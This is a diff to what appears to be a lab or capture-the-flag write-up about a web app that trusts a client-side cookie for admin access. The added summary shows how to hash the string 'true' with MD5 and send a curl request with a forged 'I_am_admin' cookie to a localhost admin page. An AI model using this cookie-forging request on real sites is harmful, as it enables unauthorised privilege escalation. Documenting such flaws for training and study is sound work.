@@ -4,6 +4,20 @@
 
 The application uses client-side cookies for authentication without server-side validation, allowing trivial privilege escalation.
 
+## Summary
+
+page: `http://localhost:8080/index.php?page=admin`
+commands:
+```bash
+# MD5 of "true"
+echo -n "true" | md5sum
+# → b326b5062b2f0e69046810717534cb09
+
+# Send request with forged cookie
+curl -b "I_am_admin=b326b5062b2f0e69046810717534cb09" \
+     "http://localhost:8080/index.php?page=admin"
+```
+
 ## Discovery
 
 During open redirect testing, a redirect to an invalid site sets a suspicious cookie:
